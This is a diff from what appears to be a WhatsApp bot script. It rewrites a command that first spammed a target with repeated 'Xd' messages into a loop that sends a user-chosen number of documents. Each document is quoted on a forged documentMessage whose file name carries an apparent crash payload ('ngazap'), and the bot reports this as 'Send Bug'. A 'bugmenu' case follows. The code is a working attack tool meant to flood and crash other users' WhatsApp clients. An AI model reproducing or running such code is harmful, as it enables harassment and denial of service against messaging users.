@@ -629,29 +629,35 @@ case 'xentag':
                     })
 break
 
-case 'xendok' : {
+case 'xendok':{
 
-Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
-a = await xinn.sendMessage(m.chat, {react: { text: " ️", key: { remoteJid: m.chat, fromMe: true, id : m.key.id}}})
-xinn.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
-await sleep(20)
-xinn.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
-await sleep(20)
-xinn.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
-await sleep(20)
-xinn.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
-await sleep(20)
-xinn.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
-await sleep(20)
-xinn.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
-await sleep(20)
-xinn.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
-await sleep(20)
-xinn.sendMessage(Pe, {text: "Xd"}, {quoted: doc})
-await sleep(20)
+
+if (args.length == 0) return m.reply(`Penggunaan ${prefix+command} jumlah\nContoh ${prefix+command} 5`)
+jumlah = `${encodeURI(q)}`
+ydd = `Powered By Xinn`
+for (let i = 0; i < jumlah; i++) {
+xinn.sendMessage(m.chat, {document: thumb},{quoted: {
+key: {
+fromMe: false, 
+participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) 
+},
+"message": {
+"documentMessage": {
+"url": "https://mmg.whatsapp.net/d/f/Aj85sbZCtNtq1cJ6JupaBUTKfgrl2zXRXGvVNWAbFnsp.enc",
+"mimetype": "application/octet-stream",
+"fileSha256": "TSSZu8gDEAPhp8vjdtJS/DXIECzjrSh3rmcoHN76M9k=",
+"fileLength": "64455",
+"pageCount": 1,
+"mediaKey": "P32GszzU5piUZ5HKluLD5h/TZzubVJ7lCAd1PIz3Qb0=",
+"fileName": `HW MODS WA${ngazap(prefix)}`,
+"fileEncSha256": "ybdZlRjhY+aXtytT0G2HHN4iKWCFisG2W69AVPLg5yk=",
+}
+}
+}})
+}
+deploy(`Sukses Send Bug Sebanyak ${jumlah}`)
 }
 break
-
 
 case 'bugmenu':
 var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
